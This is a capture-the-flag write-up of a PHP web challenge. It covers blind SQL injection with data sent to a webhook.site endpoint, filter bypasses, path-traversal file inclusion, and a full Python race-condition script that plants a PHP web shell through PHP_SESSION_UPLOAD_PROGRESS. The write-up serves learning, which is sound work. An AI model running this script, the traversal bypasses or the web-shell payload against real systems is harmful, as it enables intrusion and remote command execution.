## Skills required: Blind testing, SQL injection with filter bypass, PHP Local File Inclusion to RCE

Due to my messy workflow, I probably used about 1 day on this challenge. 😿
There are tons of rabbit holes that successfully obfuscated the blind testing - it's often hard to tell if hitting something means to carry on or to back off.

## Steps taken:

My actual steps are much less tidy, but for the sake of reading and learning it has been organized.

From the source, we can find `send_pic.php` and with some testing in Burp Suite:

![the chall begins](https://user-images.githubusercontent.com/114584910/210605448-9b1b7514-edbd-44fe-a520-0a11db3b150b.png)

![inputting 0](https://user-images.githubusercontent.com/114584910/210605462-8ec9793d-d4ce-4873-918e-ff4242252107.png)

With some basic enumeration, combined with the given MySQL database information we can conclude:
- For 1 and 2, no output is given
- For any other number, no data is given

It's easy to imagine exfiltrating the access token with SQL injection, but we can be **more sure by trying to throw some errors with type juggling**, a common trick in JavaScript and PHP challenges:

![type-juggling](https://user-images.githubusercontent.com/114584910/210605555-f837278a-aec4-4f1a-93d8-285e7db0496a.png)

We are seeing something beautiful here:
- `url` goes through `strtolower`
- `id` goes through `strpos`, which is interesting as the value should be parsed as number
- NONONO is thrown, this needs further enumeration
  - `url[1]` throws error
  - invalid url for `url` throws error

We can conjecture that the server is using the url, maybe a request is sent there? Let's spin up a webhook.site endpoint.

![webhook.site](https://user-images.githubusercontent.com/114584910/210605610-ad4686dd-4d22-469d-bf3f-a933135278e4.png)

Note that the **URL value is only sent to the URL** and does not appear in the challenge site. With a means to exfiltrate data, *now* we can look at SQL injections.

![SELECT a is OKAY](https://user-images.githubusercontent.com/114584910/210605649-cfbc0109-0014-44f6-8ccc-86f393b5cd71.png)

![SELECT id is also OKAY](https://user-images.githubusercontent.com/114584910/210605711-5800ffac-3f36-47d1-863e-6bf2e63cc864.png)

But it looks like the string `key_cc` is blacklisted (can't really show on pics).
For people with more experience with MySQL, they probably know **column names are not case sensitive.**

![exfiltrated](https://user-images.githubusercontent.com/114584910/210605848-be410c45-5f88-47a8-8d48-87082b1be73a.png)

Now we can log in. The username and password fields were a bit misleading, but now we have `get_img.php?file=messi.jpg`.

The endpoint name hints that it is susceptible to local file inclusion (aka path traversal):

![LFI](https://user-images.githubusercontent.com/114584910/210605918-0a111d2a-de19-48e8-b6ed-ff78b283b716.png)

There are many we can try now, but there are many blacklists and red herrings. **These are what I found during the CTF**:
- It's possible with `../index.php`, `../get_img.php`
- But, any request with `../..` will give no output. This is meaningless because we can use `.././..` instead.
- We can dig deeper into the rabbit hole:
  - `../.htaccess` is a nice starter, it doesn't seem very useful.
  - A typical example `/etc/passwd` shows some promising result, but invalid requests like `/aaa/bbb/ccc/etc/passwd` also show the result. *I didn't realize it was a blacklist and was mislead into thinking the string was somehow processed*
  - By trying [some word lists](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux), I could see the phrase `lib/php` is banned. This is again meaningless as `lib/./php` can be used.

Then I ran into many rabbit holes:
- I thought about bypassing the `media/` prefix for php wrappers. *It probably isn't impossible*
- I thought I needed to find the correct `php.ini` as part of the recon because of the blacklist
- Easier LFI-to-RCE routes are blocked:
  - `/proc/self/environ` has permission denied, and I can't tell if Apache log is blocked or that I had to find the true path in a non-default setting.
  Only at very late stage I realized that [it could be toughened defense](https://blog.orange.tw/2018/10/) (from Orange Tsai)
  - my php `sess` is blacklisted, but I went a long way trying to change and insert characters to bypass the `sess` blacklist.
  *In retrospect it probably isn't impossible*.
- I could access `/proc/self/fd/10` though, but I wrongly assumed that it wasn't my session and couldn't make better use of it

I did came across the [LFI-to-RCE via PHP sessions method](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions), but:
- I wrongly assumed that I could change the cookie by changing username, password and inserting cookie values manually.
- I even had access to an [excellent resource](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) (written by LeaveSong) thanks to some reassurance from organizers,
I tried it but I again I wasn't able to connect the dots and tried to bypass the `sess` blacklist.

I did know that [phpinfo can be used for LFI-to-RCE](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo),
but I didn't have access to one and of course, ran down the rabbit hole of finding one.

## Solutions:

There are 2 solutions but I'll only write about the easier one:

### [File Upload via PHP_SESSION_UPLOAD_PROGRESS + Race Condition](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php_session_upload_progress)

The actual method is included in the [aforementioned resource](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html).
Even without Google Translate I can look at the code. After the CTF it was revealed that `/proc/self/fd/10` was indeed the way to go.
In fact I was so close:
- change the LFI endpoint to `/proc/self/fd/10`
- add back the cookie in the get request
- I really don't need `phpinfo`, just put a command shell

```py
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://172.105.127.104/index.php'
session = requests.session()
flag = '8645f3a1a7419bcb2796af86ebccb917'


def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success2', '<?php system($_GET["c"]);?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )


def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=.././.././.././.././proc/self/fd/10',
            cookies={'PHPSESSID': flag},
        )

        if flag.encode() in response.content:
            e.set()


if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)
```

![pwned](https://user-images.githubusercontent.com/114584910/210606050-229f5794-2951-468b-b942-e46af7f51c81.png)

## Reflection:

- It'd be great if I can work more systematically and utilizing automation earlier (aka Burp Turbo Intruder)
- I could have communicated that I got `/proc/self/fd/10` but thought it's another guy's session instead of just saying `/proc/self/environ` was denied and may have gotten a completely different response
- LFI to RCE can be quite hard
